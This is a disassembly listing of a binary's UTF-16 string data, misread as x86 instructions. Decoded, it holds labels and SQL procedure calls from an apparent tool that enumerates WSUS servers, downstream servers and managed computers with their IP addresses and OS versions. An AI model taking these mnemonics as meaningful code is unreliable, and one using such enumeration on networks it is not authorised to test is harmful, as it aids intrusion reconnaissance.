  40a157:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a15b:	75 00                	jne    0x40a15d
  40a15d:	72 00                	jb     0x40a15f
  40a15f:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40a165:	3d 00 54 00 72       	cmp    $0x72005400,%eax
  40a16a:	00 75 00             	add    %dh,0x0(%ebp)
  40a16d:	65 00 00             	add    %al,%gs:(%eax)
  40a170:	0f 53 00             	rcpps  (%eax),%xmm0
  40a173:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a177:	76 00                	jbe    0x40a179
  40a179:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a17d:	3d 00 00 15 3b       	cmp    $0x3b150000,%eax
  40a182:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40a186:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a18a:	00 62 00             	add    %ah,0x0(%edx)
  40a18d:	61                   	popa
  40a18e:	00 73 00             	add    %dh,0x0(%ebx)
  40a191:	65 00 3d 00 00 45 0d 	add    %bh,%gs:0xd450000
  40a198:	00 0a                	add    %cl,(%edx)
  40a19a:	00 46 00             	add    %al,0x0(%esi)
  40a19d:	75 00                	jne    0x40a19f
  40a19f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1a0:	00 63 00             	add    %ah,0x0(%ebx)
  40a1a3:	74 00                	je     0x40a1a5
  40a1a5:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a1ab:	20 00                	and    %al,(%eax)
  40a1ad:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a1b1:	72 00                	jb     0x40a1b3
  40a1b3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1b4:	00 72 00             	add    %dh,0x0(%edx)
  40a1b7:	20 00                	and    %al,(%eax)
  40a1b9:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40a1be:	00 73 00             	add    %dh,0x0(%ebx)
  40a1c1:	71 00                	jno    0x40a1c3
  40a1c3:	6c                   	insb   (%dx),%es:(%edi)
  40a1c4:	00 43 00             	add    %al,0x0(%ebx)
  40a1c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1c8:	00 6e 00             	add    %ch,0x0(%esi)
  40a1cb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1cc:	00 65 00             	add    %ah,0x0(%ebp)
  40a1cf:	63 00                	arpl   %eax,(%eax)
  40a1d1:	74 00                	je     0x40a1d3
  40a1d3:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a1d9:	2e 00 01             	add    %al,%cs:(%ecx)
  40a1dc:	29 65 00             	sub    %esp,0x0(%ebp)
  40a1df:	78 00                	js     0x40a1e1
  40a1e1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a1e5:	20 00                	and    %al,(%eax)
  40a1e7:	73 00                	jae    0x40a1e9
  40a1e9:	70 00                	jo     0x40a1eb
  40a1eb:	43                   	inc    %ebx
  40a1ec:	00 6f 00             	add    %ch,0x0(%edi)
  40a1ef:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1f0:	00 66 00             	add    %ah,0x0(%esi)
  40a1f3:	69 00 67 00 75 00    	imul   $0x750067,(%eax),%eax
  40a1f9:	72 00                	jb     0x40a1fb
  40a1fb:	61                   	popa
  40a1fc:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a200:	00 6f 00             	add    %ch,0x0(%edi)
  40a203:	6e                   	outsb  %ds:(%esi),(%dx)
  40a204:	00 00                	add    %al,(%eax)
  40a206:	33 4c 00 6f          	xor    0x6f(%eax,%eax,1),%ecx
  40a20a:	00 63 00             	add    %ah,0x0(%ebx)
  40a20d:	61                   	popa
  40a20e:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40a212:	00 6f 00             	add    %ch,0x0(%edi)
  40a215:	6e                   	outsb  %ds:(%esi),(%dx)
  40a216:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a21a:	00 6e 00             	add    %ch,0x0(%esi)
  40a21d:	74 00                	je     0x40a21f
  40a21f:	43                   	inc    %ebx
  40a220:	00 61 00             	add    %ah,0x0(%ecx)
  40a223:	63 00                	arpl   %eax,(%eax)
  40a225:	68 00 65 00 4c       	push   $0x4c006500
  40a22a:	00 6f 00             	add    %ch,0x0(%edi)
  40a22d:	63 00                	arpl   %eax,(%eax)
  40a22f:	61                   	popa
  40a230:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a234:	00 6f 00             	add    %ch,0x0(%edi)
  40a237:	6e                   	outsb  %ds:(%esi),(%dx)
  40a238:	00 00                	add    %al,(%eax)
  40a23a:	21 53 00             	and    %edx,0x0(%ebx)
  40a23d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a241:	76 00                	jbe    0x40a243
  40a243:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a247:	50                   	push   %eax
  40a248:	00 6f 00             	add    %ch,0x0(%edi)
  40a24b:	72 00                	jb     0x40a24d
  40a24d:	74 00                	je     0x40a24f
  40a24f:	4e                   	dec    %esi
  40a250:	00 75 00             	add    %dh,0x0(%ebp)
  40a253:	6d                   	insl   (%dx),%es:(%edi)
  40a254:	00 62 00             	add    %ah,0x0(%edx)
  40a257:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a25b:	00 80 8d 0d 00 0a    	add    %al,0xa000d8d(%eax)
  40a261:	00 23                	add    %ah,(%ebx)
  40a263:	00 23                	add    %ah,(%ebx)
  40a265:	00 23                	add    %ah,(%ebx)
  40a267:	00 23                	add    %ah,(%ebx)
  40a269:	00 23                	add    %ah,(%ebx)
  40a26b:	00 23                	add    %ah,(%ebx)
  40a26d:	00 23                	add    %ah,(%ebx)
  40a26f:	00 23                	add    %ah,(%ebx)
  40a271:	00 23                	add    %ah,(%ebx)
  40a273:	00 23                	add    %ah,(%ebx)
  40a275:	00 23                	add    %ah,(%ebx)
  40a277:	00 23                	add    %ah,(%ebx)
  40a279:	00 23                	add    %ah,(%ebx)
  40a27b:	00 23                	add    %ah,(%ebx)
  40a27d:	00 23                	add    %ah,(%ebx)
  40a27f:	00 23                	add    %ah,(%ebx)
  40a281:	00 23                	add    %ah,(%ebx)
  40a283:	00 20                	add    %ah,(%eax)
  40a285:	00 57 00             	add    %dl,0x0(%edi)
  40a288:	53                   	push   %ebx
  40a289:	00 55 00             	add    %dl,0x0(%ebp)
  40a28c:	53                   	push   %ebx
  40a28d:	00 20                	add    %ah,(%eax)
  40a28f:	00 53 00             	add    %dl,0x0(%ebx)
  40a292:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a296:	76 00                	jbe    0x40a298
  40a298:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a29c:	20 00                	and    %al,(%eax)
  40a29e:	45                   	inc    %ebp
  40a29f:	00 6e 00             	add    %ch,0x0(%esi)
  40a2a2:	75 00                	jne    0x40a2a4
  40a2a4:	6d                   	insl   (%dx),%es:(%edi)
  40a2a5:	00 65 00             	add    %ah,0x0(%ebp)
  40a2a8:	72 00                	jb     0x40a2aa
  40a2aa:	61                   	popa
  40a2ab:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a2af:	00 6f 00             	add    %ch,0x0(%edi)
  40a2b2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2b3:	00 20                	add    %ah,(%eax)
  40a2b5:	00 76 00             	add    %dh,0x0(%esi)
  40a2b8:	69 00 61 00 20 00    	imul   $0x200061,(%eax),%eax
  40a2be:	53                   	push   %ebx
  40a2bf:	00 51 00             	add    %dl,0x0(%ecx)
  40a2c2:	4c                   	dec    %esp
  40a2c3:	00 20                	add    %ah,(%eax)
  40a2c5:	00 23                	add    %ah,(%ebx)
  40a2c7:	00 23                	add    %ah,(%ebx)
  40a2c9:	00 23                	add    %ah,(%ebx)
  40a2cb:	00 23                	add    %ah,(%ebx)
  40a2cd:	00 23                	add    %ah,(%ebx)
  40a2cf:	00 23                	add    %ah,(%ebx)
  40a2d1:	00 23                	add    %ah,(%ebx)
  40a2d3:	00 23                	add    %ah,(%ebx)
  40a2d5:	00 23                	add    %ah,(%ebx)
  40a2d7:	00 23                	add    %ah,(%ebx)
  40a2d9:	00 23                	add    %ah,(%ebx)
  40a2db:	00 23                	add    %ah,(%ebx)
  40a2dd:	00 23                	add    %ah,(%ebx)
  40a2df:	00 23                	add    %ah,(%ebx)
  40a2e1:	00 23                	add    %ah,(%ebx)
  40a2e3:	00 23                	add    %ah,(%ebx)
  40a2e5:	00 23                	add    %ah,(%ebx)
  40a2e7:	00 23                	add    %ah,(%ebx)
  40a2e9:	00 00                	add    %al,(%eax)
  40a2eb:	5f                   	pop    %edi
  40a2ec:	53                   	push   %ebx
  40a2ed:	00 65 00             	add    %ah,0x0(%ebp)
  40a2f0:	72 00                	jb     0x40a2f2
  40a2f2:	76 00                	jbe    0x40a2f4
  40a2f4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2f8:	4e                   	dec    %esi
  40a2f9:	00 61 00             	add    %ah,0x0(%ecx)
  40a2fc:	6d                   	insl   (%dx),%es:(%edi)
  40a2fd:	00 65 00             	add    %ah,0x0(%ebp)
  40a300:	2c 00                	sub    $0x0,%al
  40a302:	20 00                	and    %al,(%eax)
  40a304:	57                   	push   %edi
  40a305:	00 53 00             	add    %dl,0x0(%ebx)
  40a308:	55                   	push   %ebp
  40a309:	00 53 00             	add    %dl,0x0(%ebx)
  40a30c:	50                   	push   %eax
  40a30d:	00 6f 00             	add    %ch,0x0(%edi)
  40a310:	72 00                	jb     0x40a312
  40a312:	74 00                	je     0x40a314
  40a314:	4e                   	dec    %esi
  40a315:	00 75 00             	add    %dh,0x0(%ebp)
  40a318:	6d                   	insl   (%dx),%es:(%edi)
  40a319:	00 62 00             	add    %ah,0x0(%edx)
  40a31c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a320:	2c 00                	sub    $0x0,%al
  40a322:	20 00                	and    %al,(%eax)
  40a324:	57                   	push   %edi
  40a325:	00 53 00             	add    %dl,0x0(%ebx)
  40a328:	55                   	push   %ebp
  40a329:	00 53 00             	add    %dl,0x0(%ebx)
  40a32c:	43                   	inc    %ebx
  40a32d:	00 6f 00             	add    %ch,0x0(%edi)
  40a330:	6e                   	outsb  %ds:(%esi),(%dx)
  40a331:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a335:	00 6e 00             	add    %ch,0x0(%esi)
  40a338:	74 00                	je     0x40a33a
  40a33a:	4c                   	dec    %esp
  40a33b:	00 6f 00             	add    %ch,0x0(%edi)
  40a33e:	63 00                	arpl   %eax,(%eax)
  40a340:	61                   	popa
  40a341:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a345:	00 6f 00             	add    %ch,0x0(%edi)
  40a348:	6e                   	outsb  %ds:(%esi),(%dx)
  40a349:	00 00                	add    %al,(%eax)
  40a34b:	5f                   	pop    %edi
  40a34c:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  40a351:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a357:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a35d:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a363:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a369:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a36f:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a375:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a37b:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a381:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a387:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a38d:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a393:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a399:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a39f:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a3a5:	00 2d 00 2d 00 01    	add    %ch,0x1002d00
  40a3ab:	1f                   	pop    %ds
  40a3ac:	7b 00                	jnp    0x40a3ae
  40a3ae:	30 00                	xor    %al,(%eax)
  40a3b0:	7d 00                	jge    0x40a3b2
  40a3b2:	2c 00                	sub    $0x0,%al
  40a3b4:	20 00                	and    %al,(%eax)
  40a3b6:	7b 00                	jnp    0x40a3b8
  40a3b8:	31 00                	xor    %eax,(%eax)
  40a3ba:	7d 00                	jge    0x40a3bc
  40a3bc:	2c 00                	sub    $0x0,%al
  40a3be:	20 00                	and    %al,(%eax)
  40a3c0:	7b 00                	jnp    0x40a3c2
  40a3c2:	32 00                	xor    (%eax),%al
  40a3c4:	7d 00                	jge    0x40a3c6
  40a3c6:	0d 00 0a 00 00       	or     $0xa00,%eax
  40a3cb:	4d                   	dec    %ebp
  40a3cc:	0d 00 0a 00 46       	or     $0x46000a00,%eax
  40a3d1:	00 75 00             	add    %dh,0x0(%ebp)
  40a3d4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3d5:	00 63 00             	add    %ah,0x0(%ebx)
  40a3d8:	74 00                	je     0x40a3da
  40a3da:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a3e0:	20 00                	and    %al,(%eax)
  40a3e2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a3e6:	72 00                	jb     0x40a3e8
  40a3e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3e9:	00 72 00             	add    %dh,0x0(%edx)
  40a3ec:	20 00                	and    %al,(%eax)
  40a3ee:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40a3f3:	00 62 00             	add    %ah,0x0(%edx)
  40a3f6:	47                   	inc    %edi
  40a3f7:	00 65 00             	add    %ah,0x0(%ebp)
  40a3fa:	74 00                	je     0x40a3fc
  40a3fc:	57                   	push   %edi
  40a3fd:	00 53 00             	add    %dl,0x0(%ebx)
  40a400:	55                   	push   %ebp
  40a401:	00 53 00             	add    %dl,0x0(%ebx)
  40a404:	43                   	inc    %ebx
  40a405:	00 6f 00             	add    %ch,0x0(%edi)
  40a408:	6e                   	outsb  %ds:(%esi),(%dx)
  40a409:	00 66 00             	add    %ah,0x0(%esi)
  40a40c:	69 00 67 00 53 00    	imul   $0x530067,(%eax),%eax
  40a412:	51                   	push   %ecx
  40a413:	00 4c 00 2e          	add    %cl,0x2e(%eax,%eax,1)
  40a417:	00 01                	add    %al,(%ecx)
  40a419:	2d 65 00 78 00       	sub    $0x780065,%eax
  40a41e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a422:	20 00                	and    %al,(%eax)
  40a424:	73 00                	jae    0x40a426
  40a426:	70 00                	jo     0x40a428
  40a428:	47                   	inc    %edi
  40a429:	00 65 00             	add    %ah,0x0(%ebp)
  40a42c:	74 00                	je     0x40a42e
  40a42e:	41                   	inc    %ecx
  40a42f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a433:	00 43 00             	add    %al,0x0(%ebx)
  40a436:	6f                   	outsl  %ds:(%esi),(%dx)
  40a437:	00 6d 00             	add    %ch,0x0(%ebp)
  40a43a:	70 00                	jo     0x40a43c
  40a43c:	75 00                	jne    0x40a43e
  40a43e:	74 00                	je     0x40a440
  40a440:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a444:	73 00                	jae    0x40a446
  40a446:	00 80 8d 0d 00 0a    	add    %al,0xa000d8d(%eax)
  40a44c:	00 23                	add    %ah,(%ebx)
  40a44e:	00 23                	add    %ah,(%ebx)
  40a450:	00 23                	add    %ah,(%ebx)
  40a452:	00 23                	add    %ah,(%ebx)
  40a454:	00 23                	add    %ah,(%ebx)
  40a456:	00 23                	add    %ah,(%ebx)
  40a458:	00 23                	add    %ah,(%ebx)
  40a45a:	00 23                	add    %ah,(%ebx)
  40a45c:	00 23                	add    %ah,(%ebx)
  40a45e:	00 23                	add    %ah,(%ebx)
  40a460:	00 23                	add    %ah,(%ebx)
  40a462:	00 23                	add    %ah,(%ebx)
  40a464:	00 23                	add    %ah,(%ebx)
  40a466:	00 23                	add    %ah,(%ebx)
  40a468:	00 23                	add    %ah,(%ebx)
  40a46a:	00 23                	add    %ah,(%ebx)
  40a46c:	00 23                	add    %ah,(%ebx)
  40a46e:	00 23                	add    %ah,(%ebx)
  40a470:	00 23                	add    %ah,(%ebx)
  40a472:	00 23                	add    %ah,(%ebx)
  40a474:	00 23                	add    %ah,(%ebx)
  40a476:	00 23                	add    %ah,(%ebx)
  40a478:	00 23                	add    %ah,(%ebx)
  40a47a:	00 20                	add    %ah,(%eax)
  40a47c:	00 43 00             	add    %al,0x0(%ebx)
  40a47f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a480:	00 6d 00             	add    %ch,0x0(%ebp)
  40a483:	70 00                	jo     0x40a485
  40a485:	75 00                	jne    0x40a487
  40a487:	74 00                	je     0x40a489
  40a489:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a48d:	20 00                	and    %al,(%eax)
  40a48f:	45                   	inc    %ebp
  40a490:	00 6e 00             	add    %ch,0x0(%esi)
  40a493:	75 00                	jne    0x40a495
  40a495:	6d                   	insl   (%dx),%es:(%edi)
  40a496:	00 65 00             	add    %ah,0x0(%ebp)
  40a499:	72 00                	jb     0x40a49b
  40a49b:	61                   	popa
  40a49c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a4a0:	00 6f 00             	add    %ch,0x0(%edi)
  40a4a3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4a4:	00 20                	add    %ah,(%eax)
  40a4a6:	00 23                	add    %ah,(%ebx)
  40a4a8:	00 23                	add    %ah,(%ebx)
  40a4aa:	00 23                	add    %ah,(%ebx)
  40a4ac:	00 23                	add    %ah,(%ebx)
  40a4ae:	00 23                	add    %ah,(%ebx)
  40a4b0:	00 23                	add    %ah,(%ebx)
  40a4b2:	00 23                	add    %ah,(%ebx)
  40a4b4:	00 23                	add    %ah,(%ebx)
  40a4b6:	00 23                	add    %ah,(%ebx)
  40a4b8:	00 23                	add    %ah,(%ebx)
  40a4ba:	00 23                	add    %ah,(%ebx)
  40a4bc:	00 23                	add    %ah,(%ebx)
  40a4be:	00 23                	add    %ah,(%ebx)
  40a4c0:	00 23                	add    %ah,(%ebx)
  40a4c2:	00 23                	add    %ah,(%ebx)
  40a4c4:	00 23                	add    %ah,(%ebx)
  40a4c6:	00 23                	add    %ah,(%ebx)
  40a4c8:	00 23                	add    %ah,(%ebx)
  40a4ca:	00 23                	add    %ah,(%ebx)
  40a4cc:	00 23                	add    %ah,(%ebx)
  40a4ce:	00 23                	add    %ah,(%ebx)
  40a4d0:	00 23                	add    %ah,(%ebx)
  40a4d2:	00 23                	add    %ah,(%ebx)
  40a4d4:	00 00                	add    %al,(%eax)
  40a4d6:	67 43                	addr16 inc %ebx
  40a4d8:	00 6f 00             	add    %ch,0x0(%edi)
  40a4db:	6d                   	insl   (%dx),%es:(%edi)
  40a4dc:	00 70 00             	add    %dh,0x0(%eax)
  40a4df:	75 00                	jne    0x40a4e1
  40a4e1:	74 00                	je     0x40a4e3
  40a4e3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a4e7:	4e                   	dec    %esi
  40a4e8:	00 61 00             	add    %ah,0x0(%ecx)
  40a4eb:	6d                   	insl   (%dx),%es:(%edi)
  40a4ec:	00 65 00             	add    %ah,0x0(%ebp)
  40a4ef:	2c 00                	sub    $0x0,%al
  40a4f1:	20 00                	and    %al,(%eax)
  40a4f3:	49                   	dec    %ecx
  40a4f4:	00 50 00             	add    %dl,0x0(%eax)
  40a4f7:	41                   	inc    %ecx
  40a4f8:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40a4fc:	00 72 00             	add    %dh,0x0(%edx)
  40a4ff:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a503:	73 00                	jae    0x40a505
  40a505:	2c 00                	sub    $0x0,%al
  40a507:	20 00                	and    %al,(%eax)
  40a509:	4f                   	dec    %edi
  40a50a:	00 53 00             	add    %dl,0x0(%ebx)
  40a50d:	56                   	push   %esi
  40a50e:	00 65 00             	add    %ah,0x0(%ebp)
  40a511:	72 00                	jb     0x40a513
  40a513:	73 00                	jae    0x40a515
  40a515:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a51b:	2c 00                	sub    $0x0,%al
  40a51d:	20 00                	and    %al,(%eax)
  40a51f:	4c                   	dec    %esp
  40a520:	00 61 00             	add    %ah,0x0(%ecx)
  40a523:	73 00                	jae    0x40a525
  40a525:	74 00                	je     0x40a527
  40a527:	43                   	inc    %ebx
  40a528:	00 68 00             	add    %ch,0x0(%eax)
  40a52b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a52f:	6b 00 49             	imul   $0x49,(%eax),%eax
  40a532:	00 6e 00             	add    %ch,0x0(%esi)
  40a535:	54                   	push   %esp
  40a536:	00 69 00             	add    %ch,0x0(%ecx)
  40a539:	6d                   	insl   (%dx),%es:(%edi)
  40a53a:	00 65 00             	add    %ah,0x0(%ebp)
  40a53d:	00 67 2d             	add    %ah,0x2d(%edi)
  40a540:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a546:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a54c:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a552:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a558:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a55e:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a564:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a56a:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a570:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a576:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a57c:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a582:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a588:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a58e:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a594:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a59a:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40a5a0:	00 2d 00 2d 00 01    	add    %ch,0x1002d00
  40a5a6:	25 7b 00 30 00       	and    $0x30007b,%eax
  40a5ab:	7d 00                	jge    0x40a5ad
  40a5ad:	2c 00                	sub    $0x0,%al
  40a5af:	20 00                	and    %al,(%eax)
  40a5b1:	7b 00                	jnp    0x40a5b3
  40a5b3:	31 00                	xor    %eax,(%eax)
  40a5b5:	7d 00                	jge    0x40a5b7
  40a5b7:	2c 00                	sub    $0x0,%al
  40a5b9:	20 00                	and    %al,(%eax)
  40a5bb:	7b 00                	jnp    0x40a5bd
  40a5bd:	32 00                	xor    (%eax),%al
  40a5bf:	7d 00                	jge    0x40a5c1
  40a5c1:	2c 00                	sub    $0x0,%al
  40a5c3:	20 00                	and    %al,(%eax)
  40a5c5:	7b 00                	jnp    0x40a5c7
  40a5c7:	33 00                	xor    (%eax),%eax
  40a5c9:	7d 00                	jge    0x40a5cb
  40a5cb:	00 1d 46 00 75 00    	add    %bl,0x750046
  40a5d1:	6c                   	insb   (%dx),%es:(%edi)
  40a5d2:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40a5d6:	00 6f 00             	add    %ch,0x0(%edi)
  40a5d9:	6d                   	insl   (%dx),%es:(%edi)
  40a5da:	00 61 00             	add    %ah,0x0(%ecx)
  40a5dd:	69 00 6e 00 4e 00    	imul   $0x4e006e,(%eax),%eax
  40a5e3:	61                   	popa
  40a5e4:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5e7:	65 00 00             	add    %al,%gs:(%eax)
  40a5ea:	13 49 00             	adc    0x0(%ecx),%ecx
  40a5ed:	50                   	push   %eax
  40a5ee:	00 41 00             	add    %al,0x0(%ecx)
  40a5f1:	64 00 64 00 72       	add    %ah,%fs:0x72(%eax,%eax,1)
  40a5f6:	00 65 00             	add    %ah,0x0(%ebp)
  40a5f9:	73 00                	jae    0x40a5fb
  40a5fb:	73 00                	jae    0x40a5fd
  40a5fd:	00 1b                	add    %bl,(%ebx)
  40a5ff:	43                   	inc    %ebx
  40a600:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40a604:	00 65 00             	add    %ah,0x0(%ebp)
  40a607:	6e                   	outsb  %ds:(%esi),(%dx)
  40a608:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  40a60c:	00 65 00             	add    %ah,0x0(%ebp)
  40a60f:	72 00                	jb     0x40a611
  40a611:	73 00                	jae    0x40a613
  40a613:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a619:	00 2d 4c 00 61 00    	add    %ch,0x61004c
  40a61f:	73 00                	jae    0x40a621
  40a621:	74 00                	je     0x40a623
  40a623:	52                   	push   %edx
  40a624:	00 65 00             	add    %ah,0x0(%ebp)
  40a627:	70 00                	jo     0x40a629
  40a629:	6f                   	outsl  %ds:(%esi),(%dx)
  40a62a:	00 72 00             	add    %dh,0x0(%edx)
  40a62d:	74 00                	je     0x40a62f
  40a62f:	65 00 64 00 53       	add    %ah,%gs:0x53(%eax,%eax,1)
  40a634:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a638:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40a63c:	00 73 00             	add    %dh,0x0(%ebx)
  40a63f:	54                   	push   %esp
  40a640:	00 69 00             	add    %ch,0x0(%ecx)
  40a643:	6d                   	insl   (%dx),%es:(%edi)
  40a644:	00 65 00             	add    %ah,0x0(%ebp)
  40a647:	00 4d 0d             	add    %cl,0xd(%ebp)
  40a64a:	00 0a                	add    %cl,(%edx)
  40a64c:	00 46 00             	add    %al,0x0(%esi)
  40a64f:	75 00                	jne    0x40a651
  40a651:	6e                   	outsb  %ds:(%esi),(%dx)
  40a652:	00 63 00             	add    %ah,0x0(%ebx)
  40a655:	74 00                	je     0x40a657
  40a657:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a65d:	20 00                	and    %al,(%eax)
  40a65f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a663:	72 00                	jb     0x40a665
  40a665:	6f                   	outsl  %ds:(%esi),(%dx)
  40a666:	00 72 00             	add    %dh,0x0(%edx)
  40a669:	20 00                	and    %al,(%eax)
  40a66b:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40a670:	00 62 00             	add    %ah,0x0(%edx)
  40a673:	45                   	inc    %ebp
  40a674:	00 6e 00             	add    %ch,0x0(%esi)
  40a677:	75 00                	jne    0x40a679
  40a679:	6d                   	insl   (%dx),%es:(%edi)
  40a67a:	00 41 00             	add    %al,0x0(%ecx)
  40a67d:	6c                   	insb   (%dx),%es:(%edi)
  40a67e:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  40a682:	00 6f 00             	add    %ch,0x0(%edi)
  40a685:	6d                   	insl   (%dx),%es:(%edi)
  40a686:	00 70 00             	add    %dh,0x0(%eax)
  40a689:	75 00                	jne    0x40a68b
  40a68b:	74 00                	je     0x40a68d
  40a68d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a691:	73 00                	jae    0x40a693
  40a693:	2e 00 01             	add    %al,%cs:(%ecx)
  40a696:	3d 65 00 78 00       	cmp    $0x780065,%eax
  40a69b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a69f:	20 00                	and    %al,(%eax)
  40a6a1:	73 00                	jae    0x40a6a3
  40a6a3:	70 00                	jo     0x40a6a5
  40a6a5:	47                   	inc    %edi
  40a6a6:	00 65 00             	add    %ah,0x0(%ebp)
  40a6a9:	74 00                	je     0x40a6ab
  40a6ab:	41                   	inc    %ecx
  40a6ac:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a6b0:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a6b4:	00 77 00             	add    %dh,0x0(%edi)
  40a6b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6b8:	00 73 00             	add    %dh,0x0(%ebx)
  40a6bb:	74 00                	je     0x40a6bd
  40a6bd:	72 00                	jb     0x40a6bf
  40a6bf:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a6c3:	6d                   	insl   (%dx),%es:(%edi)
  40a6c4:	00 53 00             	add    %dl,0x0(%ebx)
  40a6c7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a6cb:	76 00                	jbe    0x40a6cd
  40a6cd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a6d1:	73 00                	jae    0x40a6d3
  40a6d3:	00 80 9f 0d 00 0a    	add    %al,0xa000d9f(%eax)
  40a6d9:	00 23                	add    %ah,(%ebx)
  40a6db:	00 23                	add    %ah,(%ebx)
  40a6dd:	00 23                	add    %ah,(%ebx)
  40a6df:	00 23                	add    %ah,(%ebx)
  40a6e1:	00 23                	add    %ah,(%ebx)
  40a6e3:	00 23                	add    %ah,(%ebx)
  40a6e5:	00 23                	add    %ah,(%ebx)
  40a6e7:	00 23                	add    %ah,(%ebx)
  40a6e9:	00 23                	add    %ah,(%ebx)
  40a6eb:	00 23                	add    %ah,(%ebx)
  40a6ed:	00 23                	add    %ah,(%ebx)
  40a6ef:	00 23                	add    %ah,(%ebx)
  40a6f1:	00 23                	add    %ah,(%ebx)
  40a6f3:	00 23                	add    %ah,(%ebx)
  40a6f5:	00 23                	add    %ah,(%ebx)
